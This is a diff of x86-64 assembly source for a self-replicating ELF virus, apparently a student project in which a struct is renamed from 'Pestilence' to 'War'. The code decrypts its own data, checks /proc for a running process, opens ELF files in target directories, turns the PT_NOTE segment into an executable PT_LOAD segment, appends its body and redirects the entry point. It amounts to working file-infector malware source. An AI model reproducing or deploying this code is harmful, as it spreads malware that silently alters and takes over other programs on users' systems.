@@ -37,7 +37,7 @@ section .text
         push rax
         push rdi
         mov rax, SC_CLOSE
-        mov rdi, VAR(Pestilence.fd_proc)
+        mov rdi, VAR(War.fd_proc)
         syscall ; nos la suda lo que esto retorne la verdad
         pop rdi
         pop rax
@@ -48,7 +48,7 @@ section .text
         push rax
         push rdi
         mov rax, SC_CLOSE
-        mov rdi, VAR(Pestilence.fd_status)
+        mov rdi, VAR(War.fd_status)
         syscall
         pop rdi
         pop rax
@@ -72,22 +72,22 @@ section .text
     __F_strlen__end:
 
     __F_mod_pt_note:
-        ; Pestilence.note_phdr_ptr es una dirección de memoria que apunta a un puntero
-        lea rax, VAR(Pestilence.note_phdr_ptr)
+        ; War.note_phdr_ptr es una dirección de memoria que apunta a un puntero
+        lea rax, VAR(War.note_phdr_ptr)
         mov rax, [rax]
         mov [rax], dword 0x01                           ; p_type = PT_LOAD
         ; mov [rax+Elf64_Phdr.p_flags], P_FLAGS               
         mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
-        mov ecx, dword VAR(Pestilence.file_final_len)
-        sub ecx, dword VAR(Pestilence.virus_size)
+        mov ecx, dword VAR(War.file_final_len)
+        sub ecx, dword VAR(War.virus_size)
         mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
-        mov VAR(Pestilence.virus_offset), rcx
-        mov rcx, VAR(Pestilence.max_vaddr_end)
+        mov VAR(War.virus_offset), rcx
+        mov rcx, VAR(War.max_vaddr_end)
         ALIGN rcx
         mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
         mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
-        mov VAR(Pestilence.new_entry), rcx
-        mov ecx, dword VAR(Pestilence.virus_size)
+        mov VAR(War.new_entry), rcx
+        mov ecx, dword VAR(War.virus_size)
         mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
         mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
         mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
@@ -96,9 +96,9 @@ section .text
 
     __F_ftruncate:
         ; ftruncate(fd_file, file_final_len)
-        mov rdi, VAR(Pestilence.fd_file)
+        mov rdi, VAR(War.fd_file)
         xor rsi, rsi
-        mov esi, dword VAR(Pestilence.file_final_len)
+        mov esi, dword VAR(War.file_final_len)
         mov rax, SC_FTRUNCATE
         syscall
         test rax, rax
@@ -116,7 +116,6 @@ section .text
         dec rdx
         dec rdx
         nop
-        ; ejemplos
         cmp rbx, rbx
         jne __F_crazy
         mov rax, rax
@@ -128,12 +127,9 @@ section .text
         sub rax, 0
         or  rax, 0
         and rax, -1
-
         not rax
         not rax
-
         cmp rbx, rsi
-        
         ret
     __F_crazy__end:
 
@@ -143,9 +139,9 @@ section .text
 
         PUSH_ALL
         push rsp
-        ; this trick allows us to access Pestilence members using the VAR macro
+        ; this trick allows us to access war members using the VAR macro
         mov rbp, rsp
-        sub rbp, Pestilence_size            ; allocate Pestilence struct on stack
+        sub rbp, War_size            ; allocate war struct on stack
 
      .decrypt_data:   
         ; Desencriptar data
@@ -153,7 +149,6 @@ section .text
         mov rbx, 0x2537683570773774
         mov rax, 0x0404040404040404 
         xor rbx, rax
-        ; lea rbx, [rel xor_pass]   ; key
         xor rcx, rcx              ; contador función
         xor rdx, rdx              ; índice key
 
@@ -166,8 +161,6 @@ section .text
         ror rbx, 8
 
         inc rcx
-        ;inc rdx
-        ;and rdx, 7
         cmp rcx, (__F_data__end - __F_data)
         jl .decrypt_data_loop       
 
@@ -175,7 +168,7 @@ section .text
         lea rax, _start
         lea rbx, _finish
         sub rbx, rax
-        mov dword VAR(Pestilence.virus_size), ebx
+        mov dword VAR(War.virus_size), ebx
 
     .open_proc:
         ; open("/proc", O_RDONLY, NULL)
@@ -186,12 +179,12 @@ section .text
         test rax, rax
         ; si falla el open de /proc, infectamos sin comprobaciones.
         jle .jump_to_host
-        mov VAR(Pestilence.fd_proc), rax
+        mov VAR(War.fd_proc), rax
 
     .dirent_proc:
          ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
-        mov rdi, VAR(Pestilence.fd_proc)
-        lea rsi, VAR(Pestilence.dirent_buffer)
+        mov rdi, VAR(War.fd_proc)
+        lea rsi, VAR(War.dirent_buffer)
         mov rdx, 1024
         mov rax, SC_GETDENTS64
         syscall
@@ -206,7 +199,7 @@ section .text
         cmp r12, rbx
         jge .dirent_proc
 
-        lea rdi, VAR(Pestilence.dirent_buffer)
+        lea rdi, VAR(War.dirent_buffer)
         add rdi, r12
 
         ; sumamos a r12 el tamaño de el dirent que vamos a procesar.
@@ -237,20 +230,6 @@ section .text
         cld
         rep movsb
 
-        ; calculamos longitud del nombre del directorio PID
-
-        ; ; rdi = puntero al nombre del directorio (string acabada en 0)
-        ; lea rdi, [r8 + dirent.d_name]
-        ; mov al, 0
-        ; mov rcx, -1   ; 0xffffffffffffffff
-        ; cld
-        ; repne scasb
-        ; ; El negado de 0xffffffffffffffff - el numero de veces que decrementa
-        ; ; hasta encontrar 0, es len + 1. (magia negra asm)
-        ; not rcx
-        ; dec rcx
-
-        ; concatenamos "/proc/" + "d_name"
         CALL_ENCRYPT(strlen)
 
         lea rdi, [rsp]
@@ -314,7 +293,7 @@ section .text
         jle .start_infection
 
         ; guardamos el valor del fd para poder cerrarlo a posteriori
-        mov VAR(Pestilence.fd_status), rax
+        mov VAR(War.fd_status), rax
 
         ; leemos el ficherín (raro sería que midiese mas de 4KB)
         mov rdi, rax
@@ -377,7 +356,7 @@ section .text
 
     .open_dir:
         ; save dirname pointer to iterate after
-        mov VAR(Pestilence.dir_name_pointer), rdi
+        mov VAR(War.dir_name_pointer), rdi
 
         ; open(rdi, O_RDONLY | O_DIRECTORY);
         mov rsi, O_RDONLY | O_DIRECTORY
@@ -387,13 +366,13 @@ section .text
         jl .next_dir
 
         ; save fd
-        mov VAR(Pestilence.fd_dir), rax
+        mov VAR(War.fd_dir), rax
 
     ; get directory entry
     .dirent:
         ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
-        mov rdi, VAR(Pestilence.fd_dir)
-        lea rsi, VAR(Pestilence.dirent_buffer)
+        mov rdi, VAR(War.fd_dir)
+        lea rsi, VAR(War.dirent_buffer)
         mov rdx, 1024
         mov rax, SC_GETDENTS64
         syscall
@@ -414,7 +393,7 @@ section .text
         jge .dirent
 
         ; shift offset from the start of the dirent struct array
-        lea rdi, VAR(Pestilence.dirent_buffer)
+        lea rdi, VAR(War.dirent_buffer)
         add rdi, r12
         CALL_ENCRYPT(crazy)
         ; add lenght of directory entry to offset
@@ -432,14 +411,14 @@ section .text
 
         ; openat(fd_dir, d_name (&rsi), O_RDWR);
         lea rsi, [rdi]
-        mov rdi, VAR(Pestilence.fd_dir)
+        mov rdi, VAR(War.fd_dir)
         mov rdx, O_RDWR
         mov rax, SC_OPENAT
         syscall
         test rax, rax
         jle .skip_file
 
-        mov VAR(Pestilence.fd_file), rax
+        mov VAR(War.fd_file), rax
 
     .fstat:
         sub rsp, 144                ;fstat struct buffer
@@ -456,7 +435,7 @@ section .text
         cmp eax, S_IFREG            ; reg file type
         jne .close_file
         mov rax, [rsp + 48]
-        mov dword VAR(Pestilence.file_original_len), eax
+        mov dword VAR(War.file_original_len), eax
 
         jmp .check_ehdr
 
@@ -468,7 +447,7 @@ section .text
         add rsp, 144                        ; deallocate fstat struct from stack
 
         ; read(fd_file, rsi, 64);
-        mov rdi, VAR(Pestilence.fd_file)
+        mov rdi, VAR(War.fd_file)
         sub rsp, Elf64_Ehdr_size            ; alloc sizeof(Elf64_Ehdr) on stack
         lea rsi, [rsp]                      ; rsi = &rsp
         mov rdx, Elf64_Ehdr_size
@@ -493,33 +472,33 @@ section .text
 
     .mmap:
         ; mmap size : original_len + 0x4000. After ftruncate, writes are OK
-        mov eax, dword VAR(Pestilence.file_original_len)
+        mov eax, dword VAR(War.file_original_len)
         ; align current size to end at 4K page so our payload is aligned by writing it
         ; at the end.
         ALIGN rax
-        mov ecx, dword VAR(Pestilence.virus_size)
+        mov ecx, dword VAR(War.virus_size)
         add rax, rcx
 
         ; save aligned size of file + virus size.
-        mov dword VAR(Pestilence.file_final_len), eax
+        mov dword VAR(War.file_final_len), eax
 
         ; mmap(NULL, file_original_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_file, 0)
         mov rdi, 0x0
         mov rsi, rax
         mov rdx, PROT_READ | PROT_WRITE
         mov r10, MAP_SHARED
-        mov r8, VAR(Pestilence.fd_file)
+        mov r8, VAR(War.fd_file)
         mov r9, 0x0
         mov rax, SC_MMAP
         syscall
         test rax, rax
         jle .close_file
-        mov VAR(Pestilence.mmap_ptr), rax   ; save mmap_ptr
+        mov VAR(War.mmap_ptr), rax   ; save mmap_ptr
 
     .check_infect:
         mov rcx, dword Traza_position
         mov rsi, rax
-        mov ebx, dword VAR(Pestilence.file_original_len)
+        mov ebx, dword VAR(War.file_original_len)
         add rsi, rbx
         sub rsi, rcx
         lea rdi, Traza
@@ -530,15 +509,15 @@ section .text
 
     .infect:
         mov rbx, [rax + Elf64_Ehdr.e_entry]         ; rbx = &(rax + e_entry)
-        mov VAR(Pestilence.original_entry), rbx         ; save original_entry
+        mov VAR(War.original_entry), rbx     ; save original_entry
         lea rbx, [rax + Elf64_Ehdr.e_phoff]         ; rbx = &(rax + e_phoff)
         mov rbx, [rbx]                              ; rbx = rax + *(rbx)
         add rbx, rax
         movzx eax, word [rax + Elf64_Ehdr.e_phnum]
         ; initialize variables seeked in loop header
         xor ecx, ecx
-        mov VAR(Pestilence.note_phdr_ptr), rcx
-        mov VAR(Pestilence.max_vaddr_end), rcx
+        mov VAR(War.note_phdr_ptr), rcx
+        mov VAR(War.max_vaddr_end), rcx
 
     ;rax = phnum
     ;rbx = phdr_pointer
@@ -554,9 +533,9 @@ section .text
         jmp .end_loop_phdr
 
     .assign_pt_note_phdr:
-        cmp qword VAR(Pestilence.note_phdr_ptr), 0x0
+        cmp qword VAR(War.note_phdr_ptr), 0x0
         jne .next_phdr
-        mov VAR(Pestilence.note_phdr_ptr), rbx
+        mov VAR(War.note_phdr_ptr), rbx
         jmp .next_phdr
 
     .compute_max_vaddr_end:
@@ -564,10 +543,10 @@ section .text
         mov r8, [rbx+Elf64_Phdr.p_vaddr]
         add r8, [rbx+Elf64_Phdr.p_memsz]
         ; if p_vaddr + p_memsz > max_vaddr_end:
-        cmp r8, VAR(Pestilence.max_vaddr_end)
+        cmp r8, VAR(War.max_vaddr_end)
         jl .next_phdr
         ; save new max_vaddr_end
-        mov VAR(Pestilence.max_vaddr_end), r8
+        mov VAR(War.max_vaddr_end), r8
 
     .next_phdr:
         dec rax
@@ -575,9 +554,9 @@ section .text
         jmp .loop_phdr
 
     .end_loop_phdr:
-        cmp qword VAR(Pestilence.note_phdr_ptr), 0x0
+        cmp qword VAR(War.note_phdr_ptr), 0x0
         je .munmap
-        cmp qword VAR(Pestilence.max_vaddr_end), 0x0
+        cmp qword VAR(War.max_vaddr_end), 0x0
         je .munmap
 
     .ftruncate:
@@ -594,9 +573,8 @@ section .text
         mov rax, 0x0404040404040404 
         xor rbx, rax
 
-        ;lea rbx, [rel xor_pass]   ; key
-        xor rcx, rcx              ; contador función
-        xor rdx, rdx              ; índice key
+        xor rcx, rcx                    ; contador función
+        xor rdx, rdx                    ; índice key
 
     .encrypt_data_loop:
         mov r8b, [r10 + rcx]
@@ -606,45 +584,43 @@ section .text
 
         ror rbx, 8
         inc rcx
-        ; inc rdx
-        ; and rdx, 7
         cmp rcx, (__F_data__end - __F_data)
         jl .encrypt_data_loop       
     
     .write_payload:
         lea rsi, _start
-        mov rdi, VAR(Pestilence.mmap_ptr)
-        add rdi, VAR(Pestilence.virus_offset)
+        mov rdi, VAR(War.mmap_ptr)
+        add rdi, VAR(War.virus_offset)
         ; nos guardamos el address del mmap que se corresponde con el principio
         ; del virus, movsb modifica este valor.
         push rdi
-        mov ecx, dword VAR(Pestilence.virus_size)
+        mov ecx, dword VAR(War.virus_size)
         cld
         rep movsb
         pop rdi
         ; Patch host_entrypoint en el mmap con el entrypoint original
-        mov rax, VAR(Pestilence.original_entry)
+        mov rax, VAR(War.original_entry)
         mov [rdi + (host_entrypoint - _start)], rax
         ; Patch virus_vaddr en el mmap con el nuevo entrypoint
-        mov rax, VAR(Pestilence.new_entry)
+        mov rax, VAR(War.new_entry)
         mov [rdi + (virus_vaddr - _start)], rax
         ; Cambiar e_entry en el ELF Header
-        mov rax, VAR(Pestilence.mmap_ptr)
-        mov rbx, VAR(Pestilence.new_entry)
+        mov rax, VAR(War.mmap_ptr)
+        mov rbx, VAR(War.new_entry)
         mov [rax + Elf64_Ehdr.e_entry], rbx
 
 
 
     .munmap:
         ;munmap(map_ptr, len)
-        mov rdi, VAR(Pestilence.mmap_ptr)
-        mov esi, dword VAR(Pestilence.file_final_len)
+        mov rdi, VAR(War.mmap_ptr)
+        mov esi, dword VAR(War.file_final_len)
         mov rax, SC_UNMAP
         syscall
 
     .close_file:
         ; TODO llamar al munmap antes de cerrar el fd.
-        mov rdi, VAR(Pestilence.fd_file)
+        mov rdi, VAR(War.fd_file)
         mov rax, SC_CLOSE
         syscall
 
@@ -654,11 +630,11 @@ section .text
 
     .close_dir:
         mov rax, SC_CLOSE
-        mov rdi, VAR(Pestilence.fd_dir)
+        mov rdi, VAR(War.fd_dir)
         syscall
 
     .next_dir:
-        mov rsi, VAR(Pestilence.dir_name_pointer)
+        mov rsi, VAR(War.dir_name_pointer)
 
     .find_null:
         cld
@@ -671,7 +647,7 @@ section .text
 
     .jump_to_host:
         mov rsp, rbp
-        add rsp, Pestilence_size
+        add rsp, War_size
         pop rsp
         POP_ALL
         ; Calcular dirección de retorno
@@ -690,12 +666,11 @@ section .text
     status_file     db      0x2F,0x70,0x72,0x6F,0x63,0x2F,0x73,0x65,0x6C,0x66,0x2F,0x73,0x74,0x61,0x74,0x75,0x73,0 ;"/proc/self/status",0 ; 18
     forbidden_prog  db      0x2F,0x76,0x69,0x6D,0 ;"/vim",0  4
     exe_string      db      0x2F,0x65,0x78,0x65,0 ;"/exe",0 ; 5
-    hello           db      "[+] hello",10,0 ;11
     proc            db      0x2F,0x70,0x72,0x6F,0x63,0x2f,0 ; "/proc/",0 ; 7
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
     __F_data__end:
     Traza_position  equ     _finish - Traza
-    Traza           db      "Pestilence version 1.0 (c)oded by tomartin & carce-bo",0  ;54
+    Traza           db      "war version 1.0 (c)oded by tomartin & carce-bo",0  ;46
     host_entrypoint dq      _dummy_host_entrypoint
     virus_vaddr     dq      _start
 
